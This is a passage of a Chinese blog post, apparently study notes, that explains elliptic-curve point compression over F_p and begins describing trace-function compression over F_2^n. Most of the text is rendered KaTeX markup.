cjk_fallback">则</span><span class="mord cjk_fallback">记</span><span class="mord cjk_fallback">为</span><span class="mopen">[</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">0</span><span class="mclose">]</span><span class="mord">.</span></span></span></span></span></p>
<p>​	对这点不太明白，为什么是 1mod2 呢？？翻看一些点压缩的论文，里面是这样描述的：</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>对任给椭圆曲线上的点（</mtext><msub><mi>x</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>y</mi><mn>1</mn></msub><mtext>）</mtext><mo>∈</mo><mi>E</mi><mo separator="true">,</mo><mtext>发送方和接收方双方约定：</mtext><mspace linebreak="newline"></mspace><mn>1.</mn><mtext>如果</mtext><msub><mi>y</mi><mn>1</mn></msub><mo>∈</mo><msub><mi>F</mi><mi>p</mi></msub><mo separator="true">,</mo><mtext>且满足</mtext><mfrac><mi>p</mi><mn>2</mn></mfrac><mo>≤</mo><msub><mi>y</mi><mn>1</mn></msub><mo>&lt;</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo separator="true">,</mo><mtext>则发送</mtext><msub><mi>x</mi><mn>1</mn></msub><mtext>和</mtext><mn>1</mn><mtext>给对方</mtext><mspace linebreak="newline"></mspace><mn>2.</mn><mtext>如果</mtext><msub><mi>y</mi><mn>1</mn></msub><mo>∈</mo><msub><mi>F</mi><mi>p</mi></msub><mo separator="true">,</mo><mtext>且满足</mtext><mn>0</mn><mo>&lt;</mo><msub><mi>y</mi><mn>1</mn></msub><mo>&lt;</mo><mfrac><mi>p</mi><mn>2</mn></mfrac><mo separator="true">,</mo><mtext>则发送</mtext><msub><mi>x</mi><mn>1</mn></msub><mtext>和</mtext><mn>0</mn><mtext>给对方</mtext><mspace linebreak="newline"></mspace><mtext>接收方收到</mtext><msub><mi>x</mi><mn>1</mn></msub><mtext>后，代入</mtext><msup><mi>Y</mi><mn>2</mn></msup><mo>=</mo><msubsup><mi>X</mi><mn>1</mn><mn>3</mn></msubsup><mo>+</mo><mi>a</mi><msub><mi>X</mi><mn>1</mn></msub><mo>+</mo><mi>b</mi><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mi>p</mi><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mtext>解出</mtext><msubsup><mi>y</mi><mn>1</mn><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup><mtext>和</mtext><msubsup><mi>y</mi><mn>1</mn><mrow><mo mathvariant="normal">′</mo><mo mathvariant="normal">′</mo></mrow></msubsup><mtext>由接收方收到的</mtext><mo stretchy="false">[</mo><mn>1</mn><mi mathvariant="normal">/</mi><mn>0</mn><mo stretchy="false">]</mo><mtext>来确定是</mtext><msubsup><mi>y</mi><mn>1</mn><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msubsup><mtext>还是</mtext><msubsup><mi>y</mi><mn>1</mn><mrow><mo mathvariant="normal">′</mo><mo mathvariant="normal">′</mo></mrow></msubsup><mi mathvariant="normal">.</mi><mspace linebreak="newline"></mspace><mtext>以上过程就是标准的</mtext><mi mathvariant="normal">&quot;</mi><mtext>点压缩</mtext><mi mathvariant="normal">&quot;</mi></mrow><annotation encoding="application/x-tex">对任给椭圆曲线上的点（x_1,y_1） \in E,发送方和接收方双方约定：\\
1.如果y_1 \in F_p,且满足\frac p2 \leq y_1 &lt;p-1,则发送x_1和1给对方\\
2.如果y_1 \in F_p,且满足 0 &lt; y_1 &lt;\frac p2 ,则发送x_1和0给对方\\
接收方收到x_1后，代入Y^2=X_1^3+aX_1+b(modp)\\
解出y_1&#x27;和y_1&#x27;&#x27;由接收方收到的[1/0]来确定是y_1&#x27; 还是y_1&#x27;&#x27;.\\以上过程就是标准的&quot;点压缩&quot;
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback">对</span><span class="mord cjk_fallback">任</span><span class="mord cjk_fallback">给</span><span class="mord cjk_fallback">椭</span><span class="mord cjk_fallback">圆</span><span class="mord cjk_fallback">曲</span><span class="mord cjk_fallback">线</span><span class="mord cjk_fallback">上</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">点</span><span class="mord cjk_fallback">（</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">）</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">发</span><span class="mord cjk_fallback">送</span><span class="mord cjk_fallback">方</span><span class="mord cjk_fallback">和</span><span class="mord cjk_fallback">接</span><span class="mord cjk_fallback">收</span><span class="mord cjk_fallback">方</span><span class="mord cjk_fallback">双</span><span class="mord cjk_fallback">方</span><span class="mord cjk_fallback">约</span><span class="mord cjk_fallback">定</span><span class="mord cjk_fallback">：</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord">1</span><span class="mord">.</span><span class="mord cjk_fallback">如</span><span class="mord cjk_fallback">果</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.7935599999999998em;vertical-align:-0.686em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">且</span><span class="mord cjk_fallback">满</span><span class="mord cjk_fallback">足</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.1075599999999999em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord">2</span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathnormal">p</span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7335400000000001em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">则</span><span class="mord cjk_fallback">发</span><span class="mord cjk_fallback">送</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">和</span><span class="mord">1</span><span class="mord cjk_fallback">给</span><span class="mord cjk_fallback">对</span><span class="mord cjk_fallback">方</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord">2</span><span class="mord">.</span><span class="mord cjk_fallback">如</span><span class="mord cjk_fallback">果</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">且</span><span class="mord cjk_fallback">满</span><span class="mord cjk_fallback">足</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7335400000000001em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.7935599999999998em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.1075599999999999em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord">2</span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathnormal">p</span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">则</span><span class="mord cjk_fallback">发</span><span class="mord cjk_fallback">送</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">和</span><span class="mord">0</span><span class="mord cjk_fallback">给</span><span class="mord cjk_fallback">对</span><span class="mord cjk_fallback">方</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1.0141079999999998em;vertical-align:-0.15em;"></span><span class="mord cjk_fallback">接</span><span class="mord cjk_fallback">收</span><span class="mord cjk_fallback">方</span><span class="mord cjk_fallback">收</span><span class="mord cjk_fallback">到</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">后</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">代</span><span class="mord cjk_fallback">入</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.1111079999999998em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-2.4530000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord mathnormal">a</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07847em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">b</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1.051892em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">解</span><span class="mord cjk_fallback">出</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8018919999999999em;"><span style="top:-2.4530000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">和</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8018919999999999em;"><span style="top:-2.4530000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">由</span><span class="mord cjk_fallback">接</span><span class="mord cjk_fallback">收</span><span class="mord cjk_fallback">方</span><span class="mord cjk_fallback">收</span><span class="mord cjk_fallback">到</span><span class="mord cjk_fallback">的</span><span class="mopen">[</span><span class="mord">1</span><span class="mord">/</span><span class="mord">0</span><span class="mclose">]</span><span class="mord cjk_fallback">来</span><span class="mord cjk_fallback">确</span><span class="mord cjk_fallback">定</span><span class="mord cjk_fallback">是</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8018919999999999em;"><span style="top:-2.4530000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">还</span><span class="mord cjk_fallback">是</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8018919999999999em;"><span style="top:-2.4530000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span><span class="mord mtight">′</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mord">.</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">上</span><span class="mord cjk_fallback">过</span><span class="mord cjk_fallback">程</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">标</span><span class="mord cjk_fallback">准</span><span class="mord cjk_fallback">的</span><span class="mord">&quot;</span><span class="mord cjk_fallback">点</span><span class="mord cjk_fallback">压</span><span class="mord cjk_fallback">缩</span><span class="mord">&quot;</span></span></span></span></span></p>
<p>​	个人理解 (1mod2) 是在下面讲到的 F_2^n 有限域里的情况 (也是最常用的情况下)</p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/05/09/c75f7a0cf4955a05.png" alt="" /></p>
<p>​	当 p 较大时，采用 &quot;点压缩&quot; 后，传输通行量大大减少，但是其加密安全性却完全没有降低。原来需要传送 2lnp 位 / 点，现在只需要 lnp+1 位 / 点，相较以前减少了一半左右。</p>
<h2 id="在f_2n上的点压缩"><a class="anchor" href="#在f_2n上的点压缩">#</a> 在 F_2^n 上的点压缩</h2>
<p>​	在这种情形下有两种方法进行点压缩：</p>
<h3 id="迹函数进行点压缩"><a class="anchor" href="#迹函数进行点压缩">#</a> 迹函数进行点压缩</h3>
<p>​	将与 ECC 相关的点的 x 坐标压缩 1 位，使得传送一个点仅需 n 位，其中 n 位用来表示 x，1 位用来确定 y 坐标</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>在有限扩张的素数域</mtext><mi>F</mi><mtext>上存在任意元素</mtext><mi>α</mi><mo>=</mo><msub><mi>c</mi><mn>1</mn></msub><msub><mi>α</mi><mn>1</mn></msub><mo>+</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo>+</mo><msub><mi>c</mi><mi>m</mi></msub><msub><mi>α</mi><mi>m</mi></msub></mrow><annotation encoding="application/x-tex">在有限扩张的素数域F上存在任意元素 \alpha=c_1\alpha_1+...
+c_m\alpha_m
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">在</span><span class="mord cjk_fallback">有</span><span class="mord cjk_fallback">限</span><span class="mord cjk_fallback">扩</span><span class="mord cjk_fallback">张</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">素</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">域</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord cjk_fallback">上</span><span class="mord cjk_fallback">存</span><span class="mord cjk_fallback">在</span><span class="mord cjk_fallback">任</span><span class="mord cjk_fallback">意</span><span class="mord cjk_fallback">元</span><span class="mord cjk_fallback">素</span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.0037em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.0037em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span></p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>对于</mtext><mi>α</mi><mo>∈</mo><msub><mi>F</mi><msup><mi>q</mi><mi>m</mi></msup></msub><mo separator="true">,</mo><mi>K</mi><mo>=</mo><msub><mi>F</mi><mi>q</mi></msub><mo separator="true">,</mo><mi>α</mi><mtext>在</mtext><mi>K</mi><mtext>上的迹</mtext><mi>T</mi><msub><mi>r</mi><mrow><mi>F</mi><mi mathvariant="normal">/</mi><mi>K</mi><mo stretchy="false">(</mo><mi>α</mi><mo stretchy="false">)</mo></mrow></msub><mtext>定义为</mtext><mspace linebreak="newline"></mspace><mi>T</mi><msub><mi>r</mi><mrow><mi>F</mi><mi mathvariant="normal">/</mi><mi>K</mi><mo stretchy="false">(</mo><mi>α</mi><mo stretchy="false">)</mo></mrow></msub><mo>=</mo><mi>α</mi><mo>+</mo><msup><mi>α</mi><mi>q</mi></msup><mo>+</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo>+</mo><msup><mi>α</mi><msup><mi>q</mi><mrow><mi>m</mi><mo>−</mo><mn>1</mn></mrow></msup></msup><mspace linebreak="newline"></mspace><mtext>若</mtext><mi>K</mi><mtext>是</mtext><mi>F</mi><mtext>的素子域，则</mtext><mi>T</mi><msub><mi>r</mi><mrow><mi>F</mi><mi mathvariant="normal">/</mi><mi>K</mi><mo stretchy="false">(</mo><mi>α</mi><mo stretchy="false">)</mo></mrow></msub><mtext>称为</mtext><mi>α</mi><mtext>的绝对迹，简写位</mtext><mi>T</mi><msub><mi>r</mi><mrow><mi>F</mi><mo stretchy="false">(</mo><mi>α</mi><mo stretchy="false">)</mo></mrow></msub></mrow><annotation encoding="application/x-tex">对于\alpha\in F_{q^m},K=F_q,\alpha在K上的迹Tr_{F/K(\alpha)}定义为\\
Tr_{F/K(\alpha)}=\alpha+\alpha^q+...+\alpha^{q^{m-1}}\\
若K是F的素子域，则Tr_{F/K(\alpha)}称为\alpha的绝对迹，简写位Tr_{F(\alpha)}
